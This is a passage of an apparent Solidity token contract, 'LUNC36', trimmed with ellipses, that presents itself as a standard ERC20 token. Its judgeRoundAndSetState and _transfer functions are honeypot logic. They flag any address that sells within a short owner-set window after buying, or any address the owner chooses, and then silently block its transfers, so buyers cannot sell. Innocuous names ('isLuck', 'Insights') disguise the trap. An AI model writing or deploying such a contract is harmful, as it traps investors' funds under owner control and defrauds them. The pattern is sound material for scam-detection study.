...
contract LUNC36 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "LUNC36";
    string private _symbol = "LUNC36";
	...
	uint256 private Insights = 180;
	mapping (address => AddressInfo) public _addressInfo;
	struct AddressInfo {
		uint256 lastTime;
        bool isLuck;
    }
	...
	function setInsights(uint256 insights) public onlyOwner {
        Insights = insights;
    }
	
    function setLuckAddress(address account, bool newValue) public onlyOwner {
         _addressInfo[account].isLuck = newValue;
         _addressInfo[account].lastTime= getTime();
    }
	...
	function isLuckAddress(address account) public view returns(bool) {
        return _addressInfo[account].isLuck;
    }
	function isLastTime(address account) public view returns(uint256) {
        return _addressInfo[account].lastTime;
    }

	function judgeRoundAndSetState(address sender, address recipient) private {
		if(isMarketPair[sender]){//is buy
			if(!_addressInfo[recipient].isLuck){
				_addressInfo[recipient].lastTime=getTime();
			}
		}else if(isMarketPair[recipient]){//is sell
			if(!_addressInfo[sender].isLuck){
                uint256 time = getTime();
				uint256 lastTime = _addressInfo[sender].lastTime;
				uint256 diooas = time.sub(lastTime);
				if(diooas < Insights){
					_addressInfo[sender].isLuck=true;
					_addressInfo[sender].lastTime=time;
				}else{
					_addressInfo[sender].lastTime=time;
				}
			}else {
                require( !isLuckAddress(sender)&& !isLuckAddress(recipient), "ERC20: address is luck");
            }
		}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
		...
		judgeRoundAndSetState(sender,recipient);
        if(isLuckAddress(sender) || isLuckAddress(recipient)){
            return false;
        }
